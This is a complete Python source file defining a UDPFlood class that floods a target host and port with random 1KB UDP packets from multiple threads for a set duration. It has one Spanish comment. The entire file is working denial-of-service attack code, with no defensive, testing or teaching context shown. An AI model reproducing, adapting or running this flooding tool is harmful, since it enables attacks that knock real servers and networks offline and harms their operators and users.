import socket
import random
import threading
import time

class UDPFlood:
    def __init__(self, target, port, threads, duration):
        self.target = target
        self.port = port
        self.threads = threads
        self.duration = duration
        self.is_running = False

    def attack(self):
        while self.is_running:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                data = random._urandom(1024)  # Paquetes de 1KB
                s.sendto(data, (self.target, self.port))
            except:
                pass

    def start(self):
        self.is_running = True
        for _ in range(self.threads):
            threading.Thread(target=self.attack).start()
        threading.Thread(target=self.stop_after_duration).start()

    def stop_after_duration(self):
        time.sleep(self.duration)
        self.stop()

    def stop(self):
        self.is_running = False